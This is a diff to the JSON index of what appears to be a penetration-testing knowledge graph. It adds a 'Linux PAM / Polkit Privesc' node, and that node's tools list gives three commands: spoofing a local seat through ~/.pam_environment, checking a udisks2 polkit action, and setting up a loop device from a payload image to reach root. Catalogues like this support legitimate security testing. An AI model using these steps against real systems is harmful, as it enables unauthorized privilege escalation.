@@ -607,6 +607,7 @@
       "linux-cron",
       "linux-kernel",
       "linux-cred-hunting",
+      "linux-pam-polkit",
       "token-impersonation",
       "windows-service-misconfig",
       "windows-stored-creds",
@@ -634,6 +635,7 @@
       "linux-cron",
       "linux-kernel",
       "linux-cred-hunting",
+      "linux-pam-polkit",
       "linux-path-hijack"
     ],
     "summary": "",
@@ -852,6 +854,25 @@
     "summary": "",
     "references": [],
     "filePath": "nodes/05-privesc/linux-kernel.md"
+  },
+  {
+    "id": "linux-pam-polkit",
+    "title": "Linux PAM / Polkit Privesc",
+    "stage": "privesc",
+    "tags": [
+      "linux"
+    ],
+    "tools": [
+      "echo -e \"XDG_SEAT=seat0\\nXDG_VTNR=1\" > ~/.pam_environment",
+      "pkcheck --action-id org.freedesktop.udisks2.loop-setup --process $$",
+      "udisksctl loop-setup -f payload.img"
+    ],
+    "leads_to": [
+      "root-linux"
+    ],
+    "summary": "",
+    "references": [],
+    "filePath": "nodes/05-privesc/linux-pam-polkit.md"
   },
   {
     "id": "linux-path-hijack",
